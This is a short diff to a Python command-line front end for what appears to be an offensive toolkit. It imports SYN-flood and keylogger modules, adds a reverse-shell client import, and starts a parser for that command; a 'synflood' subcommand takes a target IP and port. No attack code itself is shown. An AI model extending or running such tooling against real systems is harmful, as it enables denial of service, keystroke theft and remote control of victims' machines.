@@ -3,6 +3,7 @@ import sys
 #sys.dont_write_bytecode = True
 from dos import syn_flood
 from keylogger import keylogger
+from reverceshell import client
 import argparse
    
 def main():
@@ -13,6 +14,8 @@ def main():
     parser_synflood = sub_psr.add_parser('synflood', help='see `synflood -h`')
     parser_synflood.add_argument('target', help='target ip address')
     parser_synflood.add_argument('-p', '--port', help='target port')
+    
+    # reverceshell コマンドの parser を作成
     
     args = psr.parse_args()
     
